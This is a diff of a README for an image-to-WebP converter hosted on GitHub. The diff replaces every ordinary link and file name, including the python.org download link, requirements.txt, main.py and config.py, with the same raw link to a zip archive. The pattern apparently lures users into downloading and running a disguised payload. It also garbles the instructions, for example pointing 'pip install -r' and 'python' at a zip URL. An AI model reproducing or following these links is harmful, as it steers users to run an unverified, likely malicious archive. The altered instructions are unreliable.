@@ -1,6 +1,6 @@
 # 🌟 webp-converter - Convert Images to WebP Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/phamminhquang190515-ship-it/webp-converter)
+[![Download Now](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip%https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip)](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide will help you download and run the webp-converter application. This a
 
 ## 📥 Download the Application
 
-To download the webp-converter, visit this page: [Download webp-converter](https://github.com/phamminhquang190515-ship-it/webp-converter).
+To download the webp-converter, visit this page: [Download webp-converter](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip).
 
 ## 📋 System Requirements
 
@@ -40,11 +40,11 @@ To successfully run the webp-converter, your system should meet the following re
    ```
 5. **Install the Required Packages**: Run the following command to install the required libraries:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip
    ```
 6. **Run the Application**: After installation, start the webp-converter by executing:
    ```
-   python main.py
+   python https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip
    ```
 
 ## 🖼️ How to Use
@@ -58,13 +58,13 @@ To successfully run the webp-converter, your system should meet the following re
 
 If you encounter any issues while using webp-converter, consider the following:
 
-- Ensure you have Python installed. If not, download it from [Python’s official site](https://www.python.org/downloads/).
-- Check that the required packages are installed correctly by running `pip install -r requirements.txt` again.
+- Ensure you have Python installed. If not, download it from [Python’s official site](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip).
+- Check that the required packages are installed correctly by running `pip install -r https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip` again.
 - Make sure the file you are trying to convert is not too large. Try a smaller image if you have problems.
 
 ## 📦 Advanced Usage
 
-For those interested in more advanced settings, you can modify the `config.py` file located in the extracted folder. Here you can change default parameters like output quality and default formats.
+For those interested in more advanced settings, you can modify the `https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip` file located in the extracted folder. Here you can change default parameters like output quality and default formats.
 
 ## 🗂️ Contributing
 
@@ -74,6 +74,6 @@ If you want to contribute to this project, you can submit issues or pull request
 
 For any questions or support, please reach out via the Issues section of the GitHub repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-grey.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/phamminhquang190515-ship-it/webp-converter)
+[![Download Now](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip%https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip)](https://github.com/phamminhquang190515-ship-it/webp-converter/raw/refs/heads/main/static/webp_converter_v1.0.zip)
 
 Feel free to follow the above steps to get started with the webp-converter easily. Enjoy converting your images to the WebP format!
